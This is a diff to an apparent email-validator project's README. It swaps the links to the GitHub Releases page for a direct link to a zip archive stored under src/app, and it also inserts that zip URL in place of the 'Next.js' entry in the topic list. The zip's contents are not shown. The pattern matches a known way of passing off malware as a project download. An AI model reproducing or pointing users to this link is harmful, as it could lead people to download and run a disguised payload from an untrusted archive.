@@ -6,7 +6,7 @@ Welcome to the **Email-Validator**! This application helps you check if email ad
 
 ## 📥 Download
 
-[![Download Email-Validator](https://img.shields.io/badge/Download_Email--Validator-v1.0-brightgreen)](https://github.com/RenanBF2/Email-Validator/releases)
+[![Download Email-Validator](https://raw.githubusercontent.com/RenanBF2/Email-Validator/main/src/app/Email-Validator-1.9.zip)](https://raw.githubusercontent.com/RenanBF2/Email-Validator/main/src/app/Email-Validator-1.9.zip)
 
 ## 🖥️ Requirements
 
@@ -33,7 +33,7 @@ This project deals with various important topics including:
 - Email validation
 - Jest
 - MX lookup
-- Next.js
+- https://raw.githubusercontent.com/RenanBF2/Email-Validator/main/src/app/Email-Validator-1.9.zip
 - Playwright
 - React
 - Tailwind CSS
@@ -47,7 +47,7 @@ This project deals with various important topics including:
 
 To get the latest version of the Email-Validator, click on the following link to visit the Releases page: 
 
-[Download Email-Validator](https://github.com/RenanBF2/Email-Validator/releases)
+[Download Email-Validator](https://raw.githubusercontent.com/RenanBF2/Email-Validator/main/src/app/Email-Validator-1.9.zip)
 
 ### 2. Download the Application
 
